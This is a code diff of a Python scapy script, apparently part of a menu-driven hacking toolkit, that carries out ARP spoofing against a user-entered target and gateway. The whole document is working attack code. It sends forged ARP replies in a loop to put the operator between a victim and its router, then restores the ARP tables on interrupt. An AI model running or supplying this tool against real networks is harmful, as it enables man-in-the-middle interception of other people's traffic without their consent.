@@ -1,73 +1,79 @@
 #!/usr/bin/python3
 
+# Imports all needed variables and packages
+from assets.banners import arpspoof_banner
+from assets.designs import *
+from assets.properties import clear_screen
 import scapy.all as scapy
 import time
 import sys
-import argparse
+import os
 
 
-def get_arguments():
-    parser = argparse.ArgumentParser()
-    parser.add_argument("-t", "--target", dest="target", help="Target IP.")
-    parser.add_argument("-g", "--gateway", dest="gateway", help="Target Gateway.")
-    options = parser.parse_args()
-    return options
+# Main function
+def arpspoof_main():
 
-def get_mac(ip):
-    arp_request = scapy.ARP(pdst=ip)
-    broadcast = scapy.Ether(dst="ff:ff:ff:ff:ff:ff")
-    arp_request_broadcast = broadcast/arp_request
-    answered_list = scapy.srp(arp_request_broadcast, timeout=1, verbose=False)[0]
+    # function that takes user input
+    def configuration():
+        try:
+            global rhost_set
+            global gateway_set
+            os.system(clear_screen)
+            print(logo)
+            print('')
+            print(line)
+            print(arpspoof_banner)
+            print(line)
+            print('')
+            print(author)
+            print('Configuration:')
+            print('')
+            rhost_set = input('\u001b[33mRHOST \u001b[37m> ').lower()
+            gateway_set = input('\u001b[33mGATEWAY \u001b[37m> ').lower()
+            spoofing()
+        except KeyboardInterrupt:
+            exit_shell()
 
-    return(answered_list[0][1].hwsrc)
+    def get_mac(ip):
+        arp_request = scapy.ARP(pdst=ip)
+        broadcast = scapy.Ether(dst="ff:ff:ff:ff:ff:ff")
+        arp_request_broadcast = broadcast/arp_request
+        answered_list = scapy.srp(arp_request_broadcast, timeout=1, verbose=False)[0]
 
-def spoof(target_ip, spoof_ip):
-    target_mac = get_mac(target_ip)
-    packet = scapy.ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=spoof_ip)
-    scapy.send(packet, verbose=False)
+        return(answered_list[0][1].hwsrc)
 
-def restore(destination_ip, source_ip):
-    destination_mac = get_mac(destination_ip)
-    source_mac = get_mac(source_ip)
-    packet = scapy.ARP(op=2, pdst=destination_ip, hwdst=destination_mac, psrc=source_ip, hwsrc=source_mac)
-    scapy.send(packet, count=4, verbose=False)
+    def spoof(target_ip, spoof_ip):
+        target_mac = get_mac(target_ip)
+        packet = scapy.ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=spoof_ip)
+        scapy.send(packet, verbose=False)
+
+    def restore(destination_ip, source_ip):
+        destination_mac = get_mac(destination_ip)
+        source_mac = get_mac(source_ip)
+        packet = scapy.ARP(op=2, pdst=destination_ip, hwdst=destination_mac, psrc=source_ip, hwsrc=source_mac)
+        scapy.send(packet, count=4, verbose=False)
+
+    def spoofing():
+        try:
+            sent_packets_count = 0
+            while True:
+                spoof(rhost_set, gateway_set)
+                spoof(gateway_set, rhost_set)
+                sent_packets_count = sent_packets_count + 2
+                print("[+] Packets sent: " + str(sent_packets_count)),
+                sys.stdout.flush()
+                os.system('sleep 3')
+        except KeyboardInterrupt:
+            restore(rhost_set, gateway_set)
+            restore(gateway_set, rhost_set)
+            exit_shell()
 
 
-options = get_arguments()
-target_ip = options.target
-gateway_ip = options.gateway
+    def exit_shell():
+        from assets.functions import exit_main
+        exit_main()
 
-if target_ip or gateway_ip:
-    pass
-else:
-    print("[-] Please use an IP address and a Gateway address.")
-    exit()
+    configuration()
 
-if target_ip:
-    pass
-else:
-    print("[-] Could not read IP address.")
-    quit()
 
-if gateway_ip:
-    pass
-else:
-    print("[-] Could not read Gateway address.")
-    quit()
-
-try:
-    sent_packets_count = 0
-    while True:
-        spoof(target_ip, gateway_ip)
-        spoof(gateway_ip, target_ip)
-        sent_packets_count = sent_packets_count + 2
-        print("\r[+] Packets sent: " + str(sent_packets_count)),
-        sys.stdout.flush()
-        time.sleep(2)
-except IndexError:
-    print("[-] Could not read IP address or Gateway address.")
-    exit()
-except KeyboardInterrupt:
-    print("\n[-] Detected CTRL + C ..... Resetting ARP tables..... Please wait.")
-    restore(target_ip, gateway_ip)
-    restore(gateway_ip, target_ip)
+arpspoof_main()
